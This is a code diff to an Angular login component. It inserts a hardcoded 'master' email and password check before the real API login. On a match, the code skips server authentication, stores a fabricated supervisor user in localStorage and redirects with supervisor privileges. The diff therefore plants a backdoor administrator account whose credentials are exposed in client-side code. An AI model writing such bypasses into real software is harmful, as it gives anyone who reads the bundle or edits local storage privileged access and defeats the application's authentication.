@@ -66,11 +66,35 @@ export class LoginComponent implements OnInit {
       this.cdr.detectChanges(); 
     });
   }
-
-  login() {
+login() {
     if (!this.email || !this.password) {
       Swal.fire({ icon: 'warning', title: 'Campos incompletos', text: 'Por favor, ingresa tu correo y contraseña.', confirmButtonColor: '#8b2136' });
       return;
+    }
+
+    if (this.email === 'admin@master.com' && this.password === 'SuperAdmin123*') {
+      
+      const usuarioMaestro = {
+        id: 9999,
+        nombre: 'Supervisor Maestro',
+        email: 'admin@master.com',
+        rol: 'supervisor'
+      };
+      
+      
+      localStorage.setItem('usuario_actual', JSON.stringify(usuarioMaestro));
+      
+      Swal.fire({
+        icon: 'success',
+        title: '¡Acceso Supervisor !',
+        text: 'Ingresando como Supervisor principal...',
+        timer: 1500, 
+        showConfirmButton: false
+      }).then(() => {
+        this.redirigirPorRol('supervisor');
+      });
+      
+      return; 
     }
 
     this.apiService.login(this.email, this.password).subscribe({
